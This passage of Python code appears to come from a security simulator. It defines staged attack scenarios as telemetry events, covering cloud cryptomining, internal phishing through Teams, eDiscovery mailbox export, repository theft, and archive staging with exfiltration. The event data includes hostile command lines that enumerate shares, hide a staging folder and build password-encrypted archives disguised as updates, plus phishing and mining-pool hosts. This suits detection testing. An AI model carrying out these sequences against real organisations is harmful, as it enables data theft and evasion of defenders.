        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "ECS", "action": "run_task", "resource_type": "container", "resource_name": "xmrig/xmrig:latest", "success": True, "description": "XMRig mining containers deployed across 8 GPU instances — pool: pool.minexmr.com:3333", "metadata": {"attack_phase": "execution", "is_attacker": True, "mining_deployed": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 5), data={"source_ip": "{victim_ip}", "destination_ip": "194.165.16.11", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "ecs-task", "auth": "none", "bytes_sent": 1024, "bytes_received": 4096, "description": "Stratum mining protocol connection to pool.minexmr.com:3333 from GPU instance"}, requires_success=True),

        # --- Phase 7: Verify mining connectivity ---
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "{victim_ip}", "destination_ip": "194.165.16.11", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "ecs-task", "auth": "none", "bytes_sent": 4096, "bytes_received": 16384, "description": "Sustained Stratum mining traffic from 8 GPU instances — share submissions confirmed"}, requires_success=True),

        # =====================================================================
        # DAY 3 — Attacker returns to scale up mining operation
        # (miners have been running for 2 days undetected)
        # =====================================================================

        # --- Phase 8: Attacker returns and verifies operation ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "resource_development", "is_attacker": True, "return_session": True}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS EC2 Console", "action": "describe_instances", "resource_type": "instance", "resource_name": "Running GPU Instances", "success": True, "description": "Verified all 8 GPU instances still running — mining operation stable", "metadata": {"attack_phase": "resource_development", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: Request quota increase for more capacity ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS Service Quotas", "action": "request_service_quota_increase", "resource_type": "quota", "resource_name": "EC2 GPU Instance Limit — eu-west-1", "success": True, "description": "Requested GPU instance quota increase in eu-west-1 from 4 to 12", "metadata": {"attack_phase": "resource_development", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Scale up with additional instances ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "AWS EC2 Console", "action": "run_instances", "resource_type": "instance", "resource_id": "i-0abc777888999", "resource_name": "4x g5.12xlarge (eu-west-1)", "success": True, "description": "4 additional GPU instances (g5.12xlarge) launched in eu-west-1 — scaling up mining operation", "metadata": {"attack_phase": "resource_development", "is_attacker": True, "region": "eu-west-1"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "ECS", "action": "run_task", "resource_type": "container", "resource_name": "xmrig/xmrig:latest", "success": True, "description": "XMRig containers deployed on 4 new eu-west-1 instances — total 12 GPU instances mining", "metadata": {"attack_phase": "execution", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 5), data={"source_ip": "{victim_ip}", "destination_ip": "194.165.16.11", "destination_port": 3333, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "ecs-task", "auth": "none", "bytes_sent": 2048, "bytes_received": 8192, "description": "Stratum mining protocol connections from eu-west-1 GPU instances to mining pool"}, requires_success=True),

        # --- Phase 11: Deploy spot instances for cheaper mining ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "AWS EC2 Console", "action": "request_spot_instances", "resource_type": "spot_request", "resource_name": "4x p3.16xlarge Spot (ap-southeast-1)", "success": True, "description": "Spot instance request for 4 GPU instances in ap-southeast-1 at 60% discount", "metadata": {"attack_phase": "resource_development", "is_attacker": True, "region": "ap-southeast-1"}}, requires_success=True),

        # =====================================================================
        # DAY 5-6 — Billing anomaly finally detected
        # (miners ran for days before cost spike triggered manual review)
        # =====================================================================

        # --- Phase 12: Detection ---
        AttackEvent(event_type="app_event", delay=_delay(3600, 1440, 1440, 7200), data={"app": "AWS Cost Explorer", "action": "billing_anomaly_detected", "resource_type": "billing", "resource_name": "Compute Cost Anomaly", "success": True, "description": "Billing anomaly detected — compute costs exceeded $47,000 across 4 regions over 5 days, normal baseline is $2,000/month", "metadata": {"attack_phase": "impact", "billing_anomaly": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.75,
    iocs=["pool.minexmr.com", "xmr.nanopool.org"],
    expected_findings=[
        "Console login from foreign IP",
        "CloudTrail logging stopped and billing alarms deleted",
        "GPU instances provisioned across multiple regions for cryptomining",
        "Stratum protocol connections to mining pool",
        "Billing anomaly — $47,000+ compute cost vs $2,000/month baseline",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

COLLABORATION_PLATFORM_LURE = AttackScenario(
    id="collaboration_platform_lure",
    tier="T2",
    name="Collaboration Platform Lure / Internal Phishing",
    description="Attacker uses compromised account to scout the org via Teams, craft targeted lures to multiple employees via DMs, harvest a second set of credentials, then uses the new account to access sensitive resources.",
    attack_type="lateral_movement",
    events=[
        # Phase 1: Initial access with compromised account
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: Reconnaissance — scout org structure via Teams
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Microsoft Teams", "action": "open_application", "usage": "read", "resource_name": "general", "success": True, "description": "Opened Teams application", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft Teams", "action": "browse_channels", "usage": "read", "resource_name": "all-teams", "success": True, "description": "Browsed team channels and membership lists", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Microsoft Teams", "action": "read_messages", "usage": "read", "resource_name": "IT-Support", "success": True, "description": "Read recent messages in IT Support channel to understand internal lingo", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft Teams", "action": "search_directory", "usage": "read", "resource_name": "org-directory", "success": True, "description": "Searched org directory for finance and executive team members", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 3: Delivery — send targeted lures via DMs
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 40), data={"app": "Microsoft Teams", "action": "send_direct_message", "usage": "write", "resource_name": "finance-team-member", "success": True, "description": "Sent DM with malicious link disguised as shared document to finance team member", "metadata": {"attack_phase": "delivery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Microsoft Teams", "action": "send_direct_message", "usage": "write", "resource_name": "hr-team-member", "success": True, "description": "Sent DM with credential harvesting link to HR team member", "metadata": {"attack_phase": "delivery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft Teams", "action": "send_message", "usage": "write", "resource_name": "general", "success": True, "description": "Posted link to fake IT update page in general channel", "metadata": {"attack_phase": "delivery", "is_attacker": True}}, requires_success=True),
        # Phase 4: Exploitation — victim clicks and credentials captured
        AttackEvent(event_type="app_event", delay=_delay(25, 15, 5, 90), data={"app": "Microsoft Edge", "action": "navigate", "usage": "read", "resource_name": "https://login-corporate-verify.com/auth", "success": True, "description": "Finance team member clicked DM lure and visited credential harvest page", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 5), data={"app": "Microsoft Edge", "action": "form_submit", "usage": "write", "resource_name": "https://login-corporate-verify.com/auth", "success": True, "description": "Victim submitted credentials on phishing page", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),
        # Phase 5: Lateral movement — attacker uses captured credentials
        AttackEvent(event_type="login", delay=_delay(15, 8, 3, 45), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SharePoint", "action": "browse_library", "usage": "read", "resource_name": "Finance Confidential", "success": True, "description": "Accessed finance team SharePoint library with compromised account", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "download", "path": "/sharepoint/Finance Confidential/quarterly_earnings_draft.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded confidential earnings draft via compromised finance account", "metadata": {"attack_phase": "exfiltration"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook", "action": "create_forwarding_rule", "usage": "admin", "resource_name": "inbox", "success": True, "description": "Created mail forwarding rule on compromised finance account for persistence", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.65,
    iocs=["login-corporate-verify.com"],
    expected_findings=["Targeted DMs with malicious links sent to multiple employees", "Secondary victim credentials stolen via phishing", "Confidential documents accessed via lateral account", "Mail forwarding rule created for persistence"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)


# =============================================================================
# DATA THEFT / DEVOPS / SUPPLY CHAIN SCENARIOS
# =============================================================================

MAILBOX_COLLECTION_EXPORT = AttackScenario(
    id="mailbox_collection_export",
    tier="T3",
    name="Mailbox Collection via Platform Export",
    description="Attacker with compromised compliance admin credentials accesses the compliance portal, creates an eDiscovery search with a broad query, previews search results, creates an export job, monitors its status, downloads the resulting PST file, and exfiltrates it over HTTPS.",
    attack_type="data_exfiltration",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Compliance portal access ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Microsoft Purview", "action": "access_compliance_portal", "resource_name": "Purview Compliance Portal", "success": True, "description": "Accessed compliance portal — navigated to eDiscovery section", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: Compliance role check and eDiscovery case ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft Purview", "action": "list_role_groups", "resource_name": "eDiscovery Manager Role Group", "success": True, "description": "Verified compliance role membership — confirmed eDiscovery Manager permissions", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Microsoft Purview", "action": "create_case", "resource_name": "Quarterly Compliance Review 2026-Q4", "success": True, "description": "Created eDiscovery case with plausible compliance review name", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft Purview", "action": "add_custodians", "resource_name": "All Executive Mailboxes", "success": True, "description": "Added all executive mailboxes as custodial data sources to the case", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: eDiscovery search ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 20), data={"app": "Microsoft Purview", "action": "create_search", "resource_name": "All Employee Mailboxes — Broad Query", "success": True, "description": "eDiscovery search created: 'confidential OR password OR wire transfer OR merger' across all mailboxes", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: Search preview ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Microsoft Purview", "action": "preview_search_results", "resource_name": "Search Preview — 24,500 items found", "success": True, "description": "Previewed eDiscovery results — 24,500 matching items across 180 mailboxes", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 5: Export job ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 1, 10), data={"app": "Microsoft Purview", "action": "create_export_job", "resource_name": "mailbox_export — PST format", "success": True, "description": "Export job created — PST format with all versions and attachments", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 6: Export monitoring ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 60), data={"app": "Microsoft Purview", "action": "check_export_status", "resource_name": "mailbox_export", "success": True, "description": "Checked export status — 60% complete, 14.2 GB processed", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(20, 10, 5, 60), data={"app": "Microsoft Purview", "action": "check_export_status", "resource_name": "mailbox_export", "success": True, "description": "Export completed — 8.4 GB PST ready for download", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 7: PST download ---
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 10, 90), data={"action": "download", "path": "/exports/mailbox_export.pst", "system": "purview", "description": "Downloaded 8.4 GB PST export file", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        # --- Phase 8: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "bytes_sent": 9000000000, "bytes_received": 1024, "description": "8.4 GB outbound HTTPS transfer — eDiscovery PST export exfiltrated", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.8,
    iocs=[],
    expected_findings=["eDiscovery search with broad query across all mailboxes", "PST export job created", "8.4 GB PST file downloaded and exfiltrated"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

SOURCE_CODE_REPO_THEFT = AttackScenario(
    id="source_code_repo_theft",
    tier="T2",
    name="Source Code Repository Theft",
    description="Attacker with compromised developer credentials enumerates repositories, lists personal access tokens, clones multiple private repositories (core-platform, payments-service, auth-service, infrastructure-as-code), scans cloned repos for secrets, downloads CI build artifacts, and exfiltrates everything over HTTPS.",
    attack_type="data_exfiltration",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Repository enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 1, 10), data={"app": "GitHub Enterprise", "action": "list_repositories", "resource_name": "org/repos", "success": True, "description": "Enumerated all 47 repositories in organization", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: PAT enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 8), data={"app": "GitHub Enterprise", "action": "list_tokens", "resource_name": "Personal Access Tokens", "success": True, "description": "Listed personal access tokens — 3 active PATs with repo and admin:org scopes", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: Clone multiple repositories ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 2, 15), data={"app": "GitHub Enterprise", "action": "clone_repository", "resource_name": "core-platform", "success": True, "description": "Cloned core-platform repository (main product codebase)", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 10), data={"app": "GitHub Enterprise", "action": "clone_repository", "resource_name": "payments-service", "success": True, "description": "Cloned payments-service repository", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 10), data={"app": "GitHub Enterprise", "action": "clone_repository", "resource_name": "auth-service", "success": True, "description": "Cloned auth-service repository (authentication and SSO)", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 1, 8), data={"app": "GitHub Enterprise", "action": "clone_repository", "resource_name": "infrastructure-as-code", "success": True, "description": "Cloned IaC repo (Terraform configs with cloud credentials)", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 5: Secret scanning ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "GitHub Enterprise", "action": "search_code", "resource_name": "org-wide: 'password OR api_key OR secret OR AWS_ACCESS'", "success": True, "description": "Searched repos for hardcoded secrets and API keys", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        # --- Phase 6: CI artifact downloads ---
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "download", "path": "/builds/release/build-artifacts-latest.zip", "system": "ci", "description": "Downloaded latest release build artifacts from core-platform CI", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/builds/release/payments-service-artifacts.zip", "system": "ci", "description": "Downloaded payments-service CI build artifacts", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 7: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "bytes_sent": 4000000000, "bytes_received": 1024, "description": "3.7 GB outbound transfer — 4 repos and CI artifacts exfiltrated", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.75,
    iocs=[],
    expected_findings=["Login from foreign IP", "Bulk repo enumeration", "Private repos cloned (core-platform, payments, auth, IaC)", "Large outbound data transfer"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

ARCHIVE_STAGING_EXFIL = AttackScenario(
    id="archive_staging_exfil",
    tier="T3",
    name="Archive-Based Staging and Exfiltration",
    description="Attacker with compromised credentials enumerates file shares over multiple days, collects sensitive files in small batches to avoid DLP triggers, stages them in a hidden directory, compresses into password-encrypted archives disguised as system backups, and exfiltrates in sized chunks over HTTPS.",
    attack_type="data_exfiltration",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + file share recon + first batch collection
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Recon — enumerate file shares and sensitive directories ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "net view \\\\SRV-FILE01 /all", "path": "C:\\Windows\\System32\\net.exe", "pid": 5120, "integrity_level": "medium", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.3.20", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "kerberos", "bytes_sent": 1024, "bytes_received": 8192, "description": "SMB session to SRV-FILE01 — share enumeration"}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c dir \\\\SRV-FILE01\\Finance$ /s /b > C:\\Users\\Public\\listing.txt", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 5204, "integrity_level": "medium", "hash": "544876d81e69d1b482924af1b303d119c0125b851139fbe2c579e0c7812e557b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c dir \\\\SRV-FILE01\\HR-Restricted$ /s /b >> C:\\Users\\Public\\listing.txt", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 5256, "integrity_level": "medium", "hash": "544876d81e69d1b482924af1b303d119c0125b851139fbe2c579e0c7812e557b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: First batch collection — finance reports (small batch to avoid DLP) ---
        AttackEvent(event_type="file_event", delay=_delay(15, 8, 3, 40), data={"action": "read", "path": "\\\\SRV-FILE01\\Finance$\\Quarterly Reports\\Q3-2026-Revenue.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Read Q3 revenue report from finance share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "read", "path": "\\\\SRV-FILE01\\Finance$\\Quarterly Reports\\Q3-2026-Expense-Detail.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Read Q3 expense detail from finance share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.5, 5), data={"action": "copy", "path": "\\\\SRV-FILE01\\Finance$\\Budgets\\FY2027-Budget-Draft.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Copied FY2027 budget draft to local staging", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),

        # Prepare hidden staging directory
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c mkdir C:\\ProgramData\\WindowsUpdate\\cache && attrib +h +s C:\\ProgramData\\WindowsUpdate\\cache", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 5380, "integrity_level": "medium", "hash": "544876d81e69d1b482924af1b303d119c0125b851139fbe2c579e0c7812e557b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "staging", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Return + HR/contracts collection + first archive
        # (overnight gap: attacker reviews directory listings offline)
        # =====================================================================

        # --- Phase 4: Attacker returns next day ---
        AttackEvent(event_type="login", delay=_delay(1200, 360, 720, 2160), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "collection", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 5: Second batch — HR and contract files ---
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 25), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.3.20", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "kerberos", "bytes_sent": 512, "bytes_received": 4096, "description": "SMB session to SRV-FILE01 — accessing HR-Restricted share"}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "read", "path": "\\\\SRV-FILE01\\HR-Restricted$\\Compensation\\Executive-Comp-2026.xlsx", "system": "network_share", "label": "confidential", "category": "hr", "description": "Read executive compensation data", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 2}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "read", "path": "\\\\SRV-FILE01\\HR-Restricted$\\Employee-Records\\Full-Employee-Export-2026.csv", "system": "network_share", "label": "confidential", "category": "hr", "description": "Read full employee records export", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 2}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "read", "path": "\\\\SRV-FILE01\\Legal$\\Contracts\\Vendor-MSA-Collection-2026.pdf", "system": "network_share", "label": "confidential", "category": "legal", "description": "Read vendor master service agreements", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 2}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "copy", "path": "\\\\SRV-FILE01\\Legal$\\Contracts\\Pending-Acquisition-NDA.pdf", "system": "network_share", "label": "confidential", "category": "legal", "description": "Copied pending acquisition NDA to local staging", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 2}}, requires_success=True),

        # --- Phase 6: Create first encrypted archive from collected files ---
        AttackEvent(event_type="process_event", delay=_delay(15, 8, 3, 40), data={"process_name": "7za.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "7za.exe a -mhe=on -pSpr1ng2026! C:\\ProgramData\\WindowsUpdate\\cache\\wu_kb5034441.7z C:\\ProgramData\\WindowsUpdate\\cache\\batch1\\*", "path": "C:\\Users\\Public\\7za.exe", "pid": 6104, "integrity_level": "medium", "hash": "e7f6a5b4c3d2109876543fedcba876543fedcba21098765432fedcba21098765", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "staging", "is_attacker": True, "archive_batch": 1}}, requires_success=True),
        # Clean up loose files from staging to reduce forensic footprint
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c rd /s /q C:\\ProgramData\\WindowsUpdate\\cache\\batch1", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 6180, "integrity_level": "medium", "hash": "544876d81e69d1b482924af1b303d119c0125b851139fbe2c579e0c7812e557b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Final batch + second archive + staged exfil + cleanup
        # (overnight gap: attacker preps exfil infrastructure)
        # =====================================================================

        # --- Phase 7: Attacker returns for final collection and exfil ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 8: Final batch — engineering and customer data ---
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 25), data={"action": "read", "path": "\\\\SRV-FILE01\\Engineering$\\Product-Roadmap-2027.pptx", "system": "network_share", "label": "confidential", "category": "engineering", "description": "Read product roadmap from engineering share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 3}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "read", "path": "\\\\SRV-FILE01\\Sales$\\Customer-Pipeline-Full-Export.xlsx", "system": "network_share", "label": "confidential", "category": "sales", "description": "Read full customer pipeline export", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 3}}, requires_success=True),

        # Create second archive
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "7za.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "7za.exe a -mhe=on -pSpr1ng2026! C:\\ProgramData\\WindowsUpdate\\cache\\wu_kb5034442.7z C:\\ProgramData\\WindowsUpdate\\cache\\batch2\\*", "path": "C:\\Users\\Public\\7za.exe", "pid": 7220, "integrity_level": "medium", "hash": "e7f6a5b4c3d2109876543fedcba876543fedcba21098765432fedcba21098765", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "staging", "is_attacker": True, "archive_batch": 2}}, requires_success=True),

        # --- Phase 9: Staged exfiltration — sized chunks over HTTPS ---
        # Small test upload to verify exfil path
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 25), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 4096, "bytes_received": 512, "description": "Small HTTPS POST to external IP — exfil path test"}, requires_success=True),
        # Exfil first archive
        AttackEvent(event_type="network_event", delay=_delay(15, 8, 3, 40), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 524288000, "bytes_received": 1024, "description": "HTTPS upload to external IP — 500 MB encrypted archive wu_kb5034441.7z"}, requires_success=True),
        # Exfil second archive
        AttackEvent(event_type="network_event", delay=_delay(20, 10, 5, 60), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 314572800, "bytes_received": 1024, "description": "HTTPS upload to external IP — 300 MB encrypted archive wu_kb5034442.7z"}, requires_success=True),

        # --- Phase 10: Cleanup — remove staging and tools ---
